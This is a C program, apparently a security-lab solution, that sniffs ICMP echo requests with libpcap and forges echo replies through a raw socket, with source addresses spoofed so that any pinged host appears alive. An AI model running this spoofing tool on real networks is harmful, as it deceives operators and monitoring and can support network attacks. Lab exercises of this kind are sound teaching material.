// t2_3_sniff_spoof.c
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

#define PACKET_SIZE 1500

// Simple checksum
unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Raw socket used for replies
int raw_sd;

// Called for each sniffed packet
void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet) {
    (void)args;

    // Assume Ethernet + IPv4 + ICMP
    const struct ip *iph = (struct ip *)(packet + 14);
    if (iph->ip_p != IPPROTO_ICMP) return;

    int iphdr_len = iph->ip_hl * 4;
    const struct icmp *icmph = (struct icmp *)((u_char *)iph + iphdr_len);
    if (icmph->icmp_type != ICMP_ECHO) return;   // only handle echo request

    printf("[*] Got ICMP echo request %s -> %s\n",
           inet_ntoa(iph->ip_src), inet_ntoa(iph->ip_dst));

    // Build spoofed echo reply
    char buf[PACKET_SIZE];
    memset(buf, 0, sizeof(buf));

    struct ip *rip  = (struct ip *)buf;
    struct icmp *ricmp = (struct icmp *)(buf + sizeof(struct ip));

    // Copy original ICMP (header + data)
    int icmp_len = ntohs(iph->ip_len) - iphdr_len;
    memcpy(ricmp, icmph, icmp_len);

    // Change ICMP type to echo reply
    ricmp->icmp_type = ICMP_ECHOREPLY;
    ricmp->icmp_cksum = 0;
    ricmp->icmp_cksum = csum((unsigned short *)ricmp, icmp_len);

    int reply_len = sizeof(struct ip) + icmp_len;

    // Fill IP header: swap src/dst
    rip->ip_hl  = sizeof(struct ip) >> 2;
    rip->ip_v   = 4;
    rip->ip_tos = 0;
    rip->ip_len = htons(reply_len);
    rip->ip_id  = 0;
    rip->ip_off = 0;
    rip->ip_ttl = 64;
    rip->ip_p   = IPPROTO_ICMP;
    rip->ip_src = iph->ip_dst;   // from X (target) ...
    rip->ip_dst = iph->ip_src;   // ... to original pinger
    rip->ip_sum = 0;
    rip->ip_sum = csum((unsigned short *)rip, sizeof(struct ip));

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_addr.s_addr = rip->ip_dst.s_addr;

    if (sendto(raw_sd, buf, reply_len, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
    } else {
        printf("    -> Spoofed echo reply sent to %s\n",
               inet_ntoa(rip->ip_dst));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <iface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *dev = argv[1];          // e.g., br-xxxx for 10.9.0.0/24
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    // Open pcap on interface, filter ICMP
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    struct bpf_program fp;
    char filter_exp[] = "icmp";
    bpf_u_int32 net = 0;

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        pcap_perror(handle, "pcap_compile");
        exit(EXIT_FAILURE);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        pcap_perror(handle, "pcap_setfilter");
        exit(EXIT_FAILURE);
    }

    // Create raw socket for spoofed replies
    raw_sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    int one = 1;
    if (setsockopt(raw_sd, IPPROTO_IP, IP_HDRINCL,
                   &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    printf("Sniffing ICMP on %s and spoofing replies...\n", dev);
    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle);
    close(raw_sd);
    return 0;
}

